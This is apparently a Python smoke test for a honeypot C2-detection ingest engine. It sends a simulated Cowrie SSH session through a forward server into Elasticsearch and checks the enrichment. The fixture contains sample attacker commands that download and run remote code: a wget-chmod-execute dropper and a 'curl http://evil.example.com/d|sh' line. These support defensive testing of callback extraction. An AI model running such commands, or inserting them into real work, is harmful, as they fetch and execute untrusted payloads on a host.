"""End-to-end smoke test: real ES + real forward frame through the engine.

Not a unit test — run manually against a live Elasticsearch:

    C2E_ES_HOST=localhost C2E_ES_PORT=19200 python tests/integration/smoke.py

Exercises every seam the ingest path owns:
  * EsWriter.ensure_bootstrap installs the ILM policy + index template
  * ForwardServer parses a real PackedForward frame (tag-first, chunk option)
  * the engine acks the chunk (at-least-once handshake)
  * a session with inlined bytes produces shell_reference + served_file +
    file_callback rows in stingar-c2-* and an enriched session in stingar-*
  * c2_geo is mapped as geo_point (template applied, not dynamic)
"""

from __future__ import annotations

import base64
import json
import os
import socket
import threading
import time
import urllib.request
from datetime import UTC, datetime

import msgpack

from c2engine.ingest.es import EsWriter
from c2engine.ingest.forward import ForwardServer
from c2engine.ingest.server import _handle_record
from c2engine.enrich.geo import GeoEnricher

ES = f"http://{os.environ.get('C2E_ES_HOST', 'localhost')}:{os.environ.get('C2E_ES_PORT', '19200')}"
PORT = 24230

DROPPER = b"#!/bin/sh\nwget http://5.6.7.8/bins/mips; chmod +x mips; ./mips\n"
SESSION = {
    "app": "cowrie",
    "sensor": {"uuid": "smoke-uuid", "hostname": "smoke-sensor", "tags": {}, "asn": ""},
    "protocol": "ssh",
    "start_time": "2026-06-05T14:01:12Z",
    "end_time": datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ"),
    "src_ip": "59.96.137.61",
    "src_port": 51432,
    "dst_ip": "10.0.0.5",
    "dst_port": 2222,
    "hp_data": {
        "session": "smoke-session-1",
        "commands": ["wget http://59.96.137.61/bins/x.sh", "nohup bash -c 'curl http://evil.example.com/d|sh'"],
        "urls": ["http://59.96.137.61/bins/x.sh"],
        "files": [
            {
                "url": "http://59.96.137.61/bins/x.sh",
                "outfile": "var/lib/cowrie/downloads/8c1bd271",
                "shasum": "8c1bd2718a3f3ba16b34a9aa05ea0ec9968fc1d402ca6f33323fbd0a1f06b1a1",
                "action": "download",
                "status": "successful",
                "resolved_ip": "59.96.137.61",
                "content_b64": base64.b64encode(DROPPER).decode(),
            }
        ],
        "kex": {"hassh": "92674389fa1e47a27ddd8d9b63ecd42b"},
    },
}


def _es_get(path: str) -> dict:
    with urllib.request.urlopen(f"{ES}{path}", timeout=15) as r:
        return json.load(r)


def _fail(msg: str) -> None:
    raise SystemExit(f"SMOKE FAIL: {msg}")


def main() -> None:
    os.environ.setdefault("C2E_ES_HOST", "localhost")
    os.environ.setdefault("C2E_ES_PORT", "19200")

    # --- bootstrap + start the engine's forward server -------------------
    es = EsWriter()
    es.ensure_bootstrap()
    print("[1/6] bootstrap: ILM policy + index template installed")

    geo = GeoEnricher()  # no MaxMind here -> geo values absent, mapping still geo_point

    def on_record(tag: str, record: dict) -> None:
        _handle_record(tag, record, geo=geo, es=es)

    server = ForwardServer("127.0.0.1", PORT, on_record)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    time.sleep(0.3)
    print(f"[2/6] forward server listening on :{PORT}")

    # --- send a real PackedForward frame WITH a chunk option -------------
    entry = msgpack.packb([int(time.time()), SESSION])
    frame = msgpack.packb(
        ["stingar.enrichable.cowrie", entry, {"chunk": "smoke-chunk-1"}],
        use_bin_type=True,
    )
    sock = socket.create_connection(("127.0.0.1", PORT), timeout=10)
    sock.sendall(frame)
    sock.settimeout(10)
    ack_raw = sock.recv(4096)
    sock.close()
    ack = msgpack.unpackb(ack_raw, raw=False)
    if ack.get("ack") != "smoke-chunk-1":
        _fail(f"bad/absent ack: {ack!r}")
    print(f"[3/6] ack handshake: received {ack!r}")

    server.shutdown()

    # --- give ES a moment, then refresh ---------------------------------
    time.sleep(1.0)
    today = datetime.now(UTC).strftime("%Y-%m-%d")
    urllib.request.urlopen(f"{ES}/stingar-c2-*,stingar-*/_refresh", timeout=15).read()

    # --- assert: geo_point mapping on the ledger index ------------------
    mapping = _es_get(f"/stingar-c2-{today}/_mapping")
    props = next(iter(mapping.values()))["mappings"]["properties"]
    if props.get("c2_geo", {}).get("type") != "geo_point":
        _fail(f"c2_geo not geo_point: {props.get('c2_geo')}")
    print("[4/6] mapping: stingar-c2-* c2_geo is geo_point (template applied)")

    # --- assert: ledger rows --------------------------------------------
    led = _es_get("/stingar-c2-*/_search?size=50&q=session_id:smoke-session-1")
    rows = [h["_source"] for h in led["hits"]["hits"]]
    by_ev: dict[str, list] = {}
    for r in rows:
        by_ev.setdefault(r["evidence"], []).append(r)
    want = {"shell_reference", "served_file", "file_callback"}
    if not want.issubset(by_ev):
        _fail(f"missing evidence kinds: have {sorted(by_ev)} want {sorted(want)}")
    served = by_ev["served_file"][0]
    if served["family"] != "downloader.shell":
        _fail(f"family wrong: {served['family']}")
    if "5.6.7.8" not in served["callbacks"]:
        _fail(f"callback not extracted: {served['callbacks']}")
    cb = by_ev["file_callback"][0]
    if cb["c2_host"] != "5.6.7.8" or cb["evidence_rank"] != 2:
        _fail(f"chain edge wrong: {cb}")
    print(f"[5/6] ledger: {len(rows)} rows — shell_reference/served_file/file_callback all present, chain intact")

    # --- assert: enriched session, bytes stripped -----------------------
    sess = _es_get("/stingar-*/_search?q=hp_data.session:smoke-session-1")
    shits = [h["_source"] for h in sess["hits"]["hits"] if not h["_index"].startswith("stingar-c2")]
    if not shits:
        _fail("enriched session not found in stingar-*")
    doc = shits[0]
    hp = doc["hp_data"]
    # session c2_hosts = command-referenced hosts (the callback 5.6.7.8 is a
    # ledger-only chain row, not a session host).
    if set(doc.get("c2_hosts", [])) != {"59.96.137.61", "evil.example.com"}:
        _fail(f"c2_hosts wrong: {doc.get('c2_hosts')}")
    if hp.get("iocs_c2_hosts") != doc.get("c2_hosts"):
        _fail("iocs_c2_hosts != c2_hosts (should share one source)")
    if "content_b64" in hp["files"][0]:
        _fail("content_b64 not stripped from session")
    if hp.get("hassh") != "92674389fa1e47a27ddd8d9b63ecd42b":
        _fail(f"hassh not in hp_data: {hp.get('hassh')}")
    if len(hp.get("playbook_hash", "")) != 40:
        _fail(f"playbook_hash not SHA1: {hp.get('playbook_hash')}")
    print("[6/6] session: enriched in stingar-* — hp_data.{iocs_*,playbook_hash(SHA1),"
          "hassh} present, c2_hosts pivot set, content_b64 stripped")

    print("\nSMOKE PASS — every ingest seam verified end-to-end against live ES.")


if __name__ == "__main__":
    main()
